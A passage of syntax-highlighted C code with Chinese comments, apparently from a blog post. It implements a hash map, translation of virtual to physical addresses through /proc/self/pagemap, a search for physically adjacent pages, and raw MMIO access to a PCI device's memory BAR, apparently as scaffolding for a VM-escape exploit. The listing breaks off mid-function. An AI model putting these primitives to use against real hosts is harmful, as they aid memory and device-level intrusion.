class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;assert.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;ctype.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdbool.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;limits.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;errno.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stddef.h&gt;</span></span><br><span class="line"></span><br><span class="line">typedef struct hash_map_entry</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t key, value;</span><br><span class="line">    struct hash_map_entry* <span class="built_in">next</span>;</span><br><span class="line">&#125; hash_map_entry;</span><br><span class="line"></span><br><span class="line">typedef struct hash_map</span><br><span class="line">&#123;</span><br><span class="line">    hash_map_entry** entry; // 桶数组</span><br><span class="line">    size_t cap; // 桶数(<span class="number">2</span> 的幂)</span><br><span class="line">    size_t size; // 已存键值对个数</span><br><span class="line">&#125; hash_map;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define HM_INIT_CAP 0x1000u   // 初始桶数：2 的幂</span></span><br><span class="line"><span class="comment">#define LOAD_NUM 3            // 负载因子 ≈ 3/4</span></span><br><span class="line"><span class="comment">#define LOAD_DEN 4</span></span><br><span class="line"></span><br><span class="line">static inline uint64_t mix64(uint64_t x)</span><br><span class="line">&#123;</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">30</span>;</span><br><span class="line">    x *= 0xbf58476d1ce4e5b9ULL;</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">27</span>;</span><br><span class="line">    x *= 0x94d049bb133111ebULL;</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static inline size_t idx_for(const hash_map* m, uint64_t key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (size_t)(mix64(key) &amp; (m-&gt;cap - <span class="number">1</span>)); // cap 必须是 <span class="number">2</span> 的幂</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void rehash(hash_map* m, size_t new_cap)</span><br><span class="line">&#123;</span><br><span class="line">    hash_map_entry** old = m-&gt;entry;</span><br><span class="line">    size_t old_cap = m-&gt;cap;</span><br><span class="line"></span><br><span class="line">    m-&gt;entry = (hash_map_entry**)calloc(new_cap, sizeof(*m-&gt;entry));</span><br><span class="line">    m-&gt;cap = new_cap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; old_cap; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (hash_map_entry *e = old[i], *n; e; e = n)</span><br><span class="line">        &#123;</span><br><span class="line">            n = e-&gt;<span class="built_in">next</span>;</span><br><span class="line">            size_t h = (size_t)(mix64(e-&gt;key) &amp; (new_cap - <span class="number">1</span>));</span><br><span class="line">            e-&gt;<span class="built_in">next</span> = m-&gt;entry[h];</span><br><span class="line">            m-&gt;entry[h] = e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    free(old);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hash_map_init(hash_map* m)</span><br><span class="line">&#123;</span><br><span class="line">    m-&gt;cap = HM_INIT_CAP;</span><br><span class="line">    m-&gt;size = <span class="number">0</span>;</span><br><span class="line">    m-&gt;entry = (hash_map_entry**)calloc(m-&gt;cap, sizeof(*m-&gt;entry));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t hash_map_get(hash_map* m, uint64_t key)</span><br><span class="line">&#123;</span><br><span class="line">    size_t h = idx_for(m, key);</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry* e = m-&gt;entry[h]; e; e = e-&gt;<span class="built_in">next</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;key == key) <span class="keyword">return</span> e-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> UINT64_MAX; // 未找到（等价于你原来的 -<span class="number">1</span>）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hash_map_set(hash_map* m, uint64_t key, uint64_t value)</span><br><span class="line">&#123;</span><br><span class="line">    // 负载因子到 <span class="number">0.75</span> 时扩容一倍</span><br><span class="line">    <span class="keyword">if</span> ((m-&gt;size + <span class="number">1</span>) * LOAD_DEN &gt;= m-&gt;cap * LOAD_NUM)</span><br><span class="line">    &#123;</span><br><span class="line">        rehash(m, m-&gt;cap ? (m-&gt;cap &lt;&lt; <span class="number">1</span>) : HM_INIT_CAP);</span><br><span class="line">    &#125;</span><br><span class="line">    size_t h = idx_for(m, key);</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry* e = m-&gt;entry[h]; e; e = e-&gt;<span class="built_in">next</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;key == key)</span><br><span class="line">        &#123;</span><br><span class="line">            e-&gt;value = value;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hash_map_entry* e = (hash_map_entry*)calloc(<span class="number">1</span>, sizeof(*e));</span><br><span class="line">    e-&gt;key = key;</span><br><span class="line">    e-&gt;value = value;</span><br><span class="line">    e-&gt;<span class="built_in">next</span> = m-&gt;entry[h];</span><br><span class="line">    m-&gt;entry[h] = e;</span><br><span class="line">    m-&gt;size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hash_map_del(hash_map* m, uint64_t key)</span><br><span class="line">&#123;</span><br><span class="line">    size_t h = idx_for(m, key);</span><br><span class="line">    hash_map_entry *prev = NULL, *e = m-&gt;entry[h];</span><br><span class="line">    <span class="keyword">while</span> (e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;key == key)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (prev) prev-&gt;<span class="built_in">next</span> = e-&gt;<span class="built_in">next</span>;</span><br><span class="line">            <span class="keyword">else</span> m-&gt;entry[h] = e-&gt;<span class="built_in">next</span>;</span><br><span class="line">            free(e);</span><br><span class="line">            m-&gt;size--;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        prev = e;</span><br><span class="line">        e = e-&gt;<span class="built_in">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hash_map_clear(hash_map* m)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!m || !m-&gt;entry) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; m-&gt;cap; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (hash_map_entry *e = m-&gt;entry[i], *n; e; e = n)</span><br><span class="line">        &#123;</span><br><span class="line">            n = e-&gt;<span class="built_in">next</span>;</span><br><span class="line">            free(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    free(m-&gt;entry);</span><br><span class="line">    m-&gt;entry = NULL;</span><br><span class="line">    m-&gt;cap = m-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static uint64_t virt_to_phys(void* vaddr)</span><br><span class="line">&#123;</span><br><span class="line">    long pagesize = sysconf(_SC_PAGESIZE);</span><br><span class="line">    uint64_t va = (uint64_t)vaddr;</span><br><span class="line">    uint64_t page_index = va / pagesize;</span><br><span class="line">    uint64_t offset = page_index * sizeof(uint64_t);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    uint64_t entry = <span class="number">0</span>;</span><br><span class="line">    ssize_t n = pread(fd, &amp;entry, sizeof(entry), offset);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">if</span> (n != sizeof(entry)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(entry &amp; (1ULL &lt;&lt; <span class="number">63</span>)) || (entry &amp; (1ULL &lt;&lt; <span class="number">62</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        // <span class="keyword">not</span> present <span class="keyword">or</span> swapped</span><br><span class="line">        errno = EFAULT;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uint64_t pfn = entry &amp; ((1ULL &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> (pfn * pagesize) + (va % pagesize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    void* vaddr[<span class="number">2</span>];</span><br><span class="line">    size_t paddr;</span><br><span class="line">&#125; adjacent_pages_buf;</span><br><span class="line"></span><br><span class="line">void release_pages(hash_map* <span class="built_in">map</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (hash_map_entry* entry = <span class="built_in">map</span>-&gt;entry[i]; entry; entry = entry-&gt;<span class="built_in">next</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">assert</span>(munmap((void *) entry-&gt;value, PAGE_SIZE) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hash_map_clear(<span class="built_in">map</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_adjacent_pages(adjacent_pages_buf* buf)</span><br><span class="line">&#123;</span><br><span class="line">    long pagesize = sysconf(_SC_PAGESIZE);</span><br><span class="line">    hash_map* <span class="built_in">map</span> = calloc(<span class="number">1</span>, sizeof(hash_map*));</span><br><span class="line">    hash_map_init(<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">while</span> (true)</span><br><span class="line">    &#123;</span><br><span class="line">        void* vaddr = mmap(NULL, pagesize, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        size_t paddr = virt_to_phys(vaddr);</span><br><span class="line">        printf(<span class="string">&quot;[*] new page %p %p\n&quot;</span>, paddr, vaddr);</span><br><span class="line">        <span class="keyword">if</span> ((buf-&gt;vaddr[<span class="number">1</span>] = (void*)hash_map_get(<span class="built_in">map</span>, paddr + pagesize)) != (void*)-<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            buf-&gt;vaddr[<span class="number">0</span>] = (void*)vaddr;</span><br><span class="line">            buf-&gt;paddr = paddr;</span><br><span class="line">            hash_map_del(<span class="built_in">map</span>, paddr + pagesize);</span><br><span class="line">            release_pages(<span class="built_in">map</span>), free(<span class="built_in">map</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((buf-&gt;vaddr[<span class="number">0</span>] = (void*)hash_map_get(<span class="built_in">map</span>, paddr - pagesize)) != (void*)-<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            buf-&gt;vaddr[<span class="number">1</span>] = (void*)vaddr;</span><br><span class="line">            buf-&gt;paddr = paddr - pagesize;</span><br><span class="line">            hash_map_del(<span class="built_in">map</span>, paddr - pagesize);</span><br><span class="line">            hash_map_clear(<span class="built_in">map</span>), free(<span class="built_in">map</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hash_map_set(<span class="built_in">map</span>, paddr, (size_t)vaddr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void qword_dump(char* desc, void* addr, <span class="built_in">int</span> <span class="built_in">len</span>)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t* buf64 = (uint64_t*)addr;</span><br><span class="line">    uint8_t* buf8 = (uint8_t*)addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">len</span> / <span class="number">8</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            i + j &lt; <span class="built_in">len</span> / <span class="number">8</span> ? printf(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : printf(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; <span class="built_in">len</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(<span class="string">&quot;%c&quot;</span>, isprint(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        puts(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#define IORESOURCE_MEM 0x00000200ULL</span></span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    volatile uint8_t* bar; // 映射后的虚拟基址</span><br><span class="line">    size_t size; // 资源真实大小（end - start + <span class="number">1</span>）</span><br><span class="line">    size_t map_len; // 实际 mmap 的长度（按页对齐）</span><br><span class="line">    <span class="built_in">int</span> fd; // 打开的 /sys/.../resourceN</span><br><span class="line">    <span class="built_in">int</span> res_idx; // 选中的 resource 行号（BAR 号 <span class="number">0.</span><span class="number">.5</span>）</span><br><span class="line">    // 新增：物理信息</span><br><span class="line">    uint64_t phys_start; // 该映射对应的设备物理起始地址（BAR 起点）</span><br><span class="line">    uint64_t phys_end; // 物理结束地址（含端点）</span><br><span class="line">    unsigned long long res_flags; // resource 行里的 flags（可用于判断 WC 等）</span><br><span class="line">    <span class="built_in">bool</span> inited;</span><br><span class="line">&#125; mmio_ctx_t;</span><br><span class="line"></span><br><span class="line">static mmio_ctx_t g_mmio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">/* --- 内部：把 BDF 或 /sys/.../resource 解析成两个路径 --- */</span><br><span class="line">static <span class="built_in">int</span> build_paths(const char* bdf_or_path,</span><br><span class="line">                       char* resource_txt, size_t txt_sz,</span><br><span class="line">                       char* dev_dir, size_t dir_sz)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!bdf_or_path || !*bdf_or_path)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strchr(bdf_or_path, <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        /* 直接传了 /sys/.../resource 或 /sys/.../resourceN */</span><br><span class="line">        snprintf(resource_txt, txt_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        snprintf(dev_dir, dir_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        char* slash = strrchr(dev_dir, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!slash)</span><br><span class="line">        &#123;</span><br><span class="line">            errno = EINVAL;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *slash = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        // 如果传进来的是 resourceN，把它回退到目录再去拼 resource</span><br><span class="line">        <span class="keyword">if</span> (strstr(resource_txt, <span class="string">&quot;/resource&quot;</span>) &amp;&amp; resource_txt[strlen(resource_txt) - <span class="number">1</span>] &gt;= <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &amp;&amp; resource_txt[strlen(resource_txt) - <span class="number">1</span>] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            snprintf(resource_txt, txt_sz, <span class="string">&quot;%s/resource&quot;</span>, dev_dir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        /* 传的是 BDF */</span><br><span class="line">        snprintf(resource_txt, txt_sz, <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">        snprintf(dev_dir, dir_sz, <span class="string">&quot;/sys/bus/pci/devices/%s&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* --- 内部：解析 resource 文本，找内存型 BAR（或指定 BAR） --- */</span><br><span class="line">static <span class="built_in">int</span> parse_mem_bar(const char* resource_txt, <span class="built_in">int</span> bar_idx,</span><br><span class="line">                         unsigned long long* start,</span><br><span class="line">                         unsigned long long* end,</span><br><span class="line">                         unsigned long long* flags,</span><br><span class="line">                         <span class="built_in">int</span>* picked_idx)</span><br><span class="line">&#123;</span><br><span class="line">    FILE* fp = fopen(resource_txt, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> idx = <span class="number">0</span>, sel = -<span class="number">1</span>;</span><br><span class="line">    char line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, sizeof(line), fp))</span><br><span class="line">    &#123;</span><br><span class="line">        unsigned long long s = <span class="number">0</span>, e = <span class="number">0</span>, f = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (sscanf(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;s, &amp;e, &amp;f) != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            idx++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(f &amp; IORESOURCE_MEM) || e &lt; s)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = EINVAL;</span><br><span class="line">                    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sel = idx;</span><br><span class="line">                <span class="keyword">if</span> (start) *start = s;</span><br><span class="line">                <span class="keyword">if</span> (end) *end = e;</span><br><span class="line">                <span class="keyword">if</span> (flags) *flags = f;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (f &amp; IORESOURCE_MEM))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (e &lt; s)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = ERANGE;</span><br><span class="line">                    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sel = idx;</span><br><span class="line">                <span class="keyword">if</span> (start) *start = s;</span><br><span class="line">                <span class="keyword">if</span> (end) *end = e;</span><br><span class="line">                <span class="keyword">if</span> (flags) *flags = f;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (sel &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ENOENT;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (picked_idx) *picked_idx = sel;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* --- 对外：初始化 / 映射 --- */</span><br><span class="line"><span class="built_in">int</span> mmio_init(const char* bdf_or_path, <span class="built_in">int</span> bar_idx)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EALREADY;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char resource_txt[PATH_MAX];</span><br><span class="line">    char dev_dir[PATH_MAX];</span><br><span class="line">    <span class="keyword">if</span> (build_paths(bdf_or_path, resource_txt, sizeof(resource_txt),</span><br><span class="line">                    dev_dir, sizeof(dev_dir)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    unsigned long long start = <span class="number">0</span>, end = <span class="number">0</span>, flags = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> res_idx = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_mem_bar(resource_txt, bar_idx, &amp;start, &amp;end, &amp;flags, &amp;res_idx) != <span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    size_t size = (size_t)((end - start) + 1ULL);</span><br><span class="line">    size_t pg = (size_t)sysconf(_SC_PAGESIZE);</span><br><span class="line">    size_t map_len = (size + pg - <span class="number">1</span>) &amp; ~(pg - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    char res_path[PATH_MAX];</span><br><span class="line">    snprintf(res_path, sizeof(res_path), <span class="string">&quot;%s/resource%d&quot;</span>, dev_dir, res_idx);</span><br><span class="line">    <span class="built_in">int</span> fd = <span class="built_in">open</span>(res_path, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    // 对 MMIO，MAP_SHARED 必须；是否加 MAP_POPULATE 对 MMIO 不关键</span><br><span class="line">    void* <span class="built_in">map</span> = mmap(NULL, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> sv = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = sv;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g_mmio.bar = (volatile uint8_t*)<span class="built_in">map</span>;</span><br><span class="line">    g_mmio.size = size;</span><br><span class="line">    g_mmio.map_len = map_len;</span><br><span class="line">    g_mmio.fd = fd;</span><br><span class="line">    g_mmio.res_idx = res_idx;</span><br><span class="line">    g_mmio.phys_start = (uint64_t)start;</span><br><span class="line">    g_mmio.phys_end = (uint64_t)end;</span><br><span class="line">    g_mmio.res_flags = flags;</span><br><span class="line">    g_mmio.inited = true;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mmio_fini(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.bar) munmap((void*)g_mmio.bar, g_mmio.map_len);</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.fd &gt;= <span class="number">0</span>) close(g_mmio.fd);</span><br><span class="line">    memset(&amp;g_mmio, <span class="number">0</span>, sizeof(g_mmio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* --- 查询（虚拟信息） --- */</span><br><span class="line">volatile void* mmio_base(void) &#123; <span class="keyword">return</span> g_mmio.bar; &#125;</span><br><span class="line">size_t mmio_size(void) &#123; <span class="keyword">return</span> g_mmio.size; &#125;</span><br><span class="line"><span class="built_in">int</span> mmio_bar_index(void) &#123; <span class="keyword">return</span> g_mmio.res_idx; &#125;</span><br><span class="line"></span><br><span class="line">/* --- 查询（物理信息） --- */</span><br><span class="line">uint64_t mmio_phys_base(void) &#123; <span class="keyword">return</span> g_mmio.phys_start; &#125;</span><br><span class="line">uint64_t mmio_phys_limit(void) &#123; <span class="keyword">return</span> g_mmio.phys_end; &#125; // inclusive</span><br><span class="line"></span><br><span class="line">/* off -&gt; 设备物理地址（范围检查） */</span><br><span class="line">uint64_t mmio_offset_to_phys(size_t off)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (uint64_t)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* VA(映射内某指针) -&gt; 设备物理地址（范围检查） */</span><br><span class="line">uint64_t mmio_virt_to_phys(const void* p)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited || !p)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uintptr_t base = (uintptr_t)g_mmio.bar;</span><br><span class="line">    uintptr_t addr = (uintptr_t)p;</span><br><span class="line">    <span class="keyword">if</span> (addr &lt; base || addr &gt;= base + g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    size_t off = (size_t)(addr - base);</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (uint64_t)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* --- 内部：范围检查 --- */</span><br><span class="line">static inline <span class="built_in">int</span> chk(size_t off, size_t width)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (off + width &gt; g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* --- 读写 API（按天然宽度访问；PCI 寄存器通常小端） --- */</span><br><span class="line">uint8_t mmio_read8(size_t off)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(volatile uint8_t*)(g_mmio.bar + off);</span><br><span 